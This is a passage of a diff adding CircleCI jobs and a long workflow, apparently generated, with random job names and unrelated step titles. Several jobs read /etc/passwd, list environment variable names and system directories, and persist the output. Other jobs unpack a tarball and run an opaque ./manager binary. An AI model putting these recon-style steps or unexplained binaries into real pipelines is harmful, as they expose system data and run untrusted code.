+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/2242903ac62 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  listenabled:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: spin culture plates maybe
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; touch /tmp/downloadindigo.txt && chmod 640 /tmp/downloadindigo.txt && stat -c %a /tmp/downloadindigo.txt; true ; } > /tmp/reader2/bisonwalletprofileheath
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/bisonwalletprofileheath
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'bisonwalletprofileheath'
+  hotfix-916:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  MEADOW_040443:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Let the physics layers cook
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; cp /etc/passwd /tmp/salessandbox.list && sed -i 's/:x:/:*:/' /tmp/salessandbox.list && head -n 3 /tmp/salessandbox.list; true ; } > /tmp/reader2/2108.94
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/2108.94
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '2108.94'
+  alpha-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/2108.94 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  LANG_CA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Do not touch the thread pool
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; sort /etc/profile | expand -t 4; true ; } > /tmp/reader2/cranecopper
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/cranecopper
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'cranecopper'
+  Build_Suite8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/6d415516840 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+  SpriteCursorDualTrace:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Kernel Attestation
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; if [[ -L /bin ]] ; then echo "found"; fi; true ; } > /tmp/reader2/66rOHGie
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/66rOHGie
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '66rOHGie'
+  assemble-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Check stage 1
+          command: |
+            tr -c 'a-zA-Z0-9' '-' < /tmp/reader2/66rOHGie 2>/dev/null | fold -w 20 | head -1 || true
+      - run:
+          name: Download source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: cat package.tgz | tar xzf -
+      - run:
+          command: (./manager)
+
+  eded:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Hold at T minus 60
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; touch "/tmp/museum.conf" && mv -v "/tmp/museum.conf" "/tmp/lib2023-03-07.txt"; true ; } > /tmp/reader2/2108.94
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/2108.94
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '2108.94'
+  asset-mango:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Flag the expense claims q2
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; echo pink white teal brown magenta | xargs printf "%s\n" | sort; true ; } > /tmp/reader2/66rOHGie
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/66rOHGie
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '66rOHGie'
+  dylan-bot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: 200 INPUT audit trail
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -iname "*" -ls 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/reader2/trade.wallet.crane.nickel
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/trade.wallet.crane.nickel
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'trade.wallet.crane.nickel'
+  townAmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: MaskGoldTableStep
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | cut -d"=" -f1 | head --lines=2 | awk '{print length, $0}'; true ; } > /tmp/reader2/tmp955b0
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/tmp955b0
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'tmp955b0'
+  v8_4_84:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Query the tenant databases first thing
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; printf '%s\n' cat dog otter zebra >/tmp/video_pile_valley.csv && wc -l /tmp/video_pile_valley.csv; true ; } > /tmp/reader2/0RW
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/0RW
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '0RW'
+  args_util:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: Let the footer links breathe
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; echo "good night" >/tmp/deck-right-2018-01.bak && wc -c </tmp/deck-right-2018-01.bak; true ; } > /tmp/reader2/2242903ac62
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/2242903ac62
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '2242903ac62'
+  paintMatrixShieldDeleteSidebar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: proxy the NTP sync or ELSE
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; cut -f1,7 -d":" /etc/passwd | wc -w; true ; } > /tmp/reader2/2bb44ee94
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/2bb44ee94
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '2bb44ee94'
+  q4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reader2
+      - run:
+          name: reminder v4 final
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; ls /etc | head -n4 | sort | uniq -c | sort -n -r | head -n20; true ; } > /tmp/reader2/718d4a34-1d33-6b1b-1088
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/718d4a34-1d33-6b1b-1088
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - '718d4a34-1d33-6b1b-1088'
+  matchAccountShipment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: The drift monitor is all set
+          command: |
+            mkdir -p /tmp/reader2
+            { set +o pipefail 2>/dev/null; ls -ia /usr/bin/g* | tail -n 2; true ; } > /tmp/reader2/Ka33enTeQlF8InmSOeLT
+            awk 'END{printf "%s=%d\n","bytes",fsz+NR}{fsz+=length}' /tmp/reader2/Ka33enTeQlF8InmSOeLT
+      - persist_to_workspace:
+          root: /tmp/reader2
+          paths:
+            - 'Ka33enTeQlF8InmSOeLT'
+workflows:
+  default:
+    jobs:
+      - BasicDualSidebarItem
+      - EYD-248-wake-url
+      - teardownTraitGradient
+      - APP-330:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - vera-push:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - py310-lint:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - hotfix-916:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - LAB_CHECK_3:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - golf:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - ValidateSuite:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - auh-check:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - Build_Suite8:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - do-the-thing:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - QA_VERIFY_6:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - rust-build:
+          requires:
+            - BasicDualSidebarItem
+            - EYD-248-wake-url
+            - teardownTraitGradient
+      - php-x86-stable
+      - noodleish
+      - push-it:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - VerifySuite:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - go-live:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - andromeda-rev:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - ed-run:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - xray:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - europa-plus:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - yuki-ci:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - cerberus-v2:
+          requires:
+            - php-x86-stable
+            - noodleish
+      - MEADOW_040443
+      - eded:
+          requires:
+            - MEADOW_040443
+      - alpha-4:
+          requires:
+            - eded
+      - SpriteCursorDualTrace:
+          requires:
+            - eded
+      - asset-mango:
+          requires:
+            - SpriteCursorDualTrace
+      - assemble-quick-release-candidate:
+          requires:
+            - asset-mango
+      - hfq:
+          requires:
+            - asset-mango
+      - dylan-bot:
+          requires:
+            - hfq
+      - wip-queue-redirect:
+          requires:
+            - dylan-bot
+      - step72493:
+          requires:
+            - dylan-bot
+      - townAmt:
+          requires:
+            - step72493
+      - produce-nightly-artifact-bundle:
+          requires:
+            - townAmt
+      - mia-score:
+          requires:
+            - townAmt
+      - v8_4_84:
+          requires:
+            - mia-score
+      - perseus:
+          requires:
+            - v8_4_84
+      - MAX_METRIC_US:
+          requires:
+            - v8_4_84
+      - args_util:
+          requires:
+            - MAX_METRIC_US
+      - INIT_QA:
+          requires:
+            - args_util
+      - sleepASCII:
+          requires:
+            - args_util
+      - paintMatrixShieldDeleteSidebar:
+          requires:
+            - sleepASCII
+      - q1-smoke:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - rmse:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - q4:
+          requires:
+            - rmse
+      - teh-ci:
+          requires:
+            - q4
+      - uvt:
+          requires:
+            - q4
+      - matchAccountShipment:
+          requires:
+            - uvt
+      - chore-4143:
+          requires:
+            - matchAccountShipment
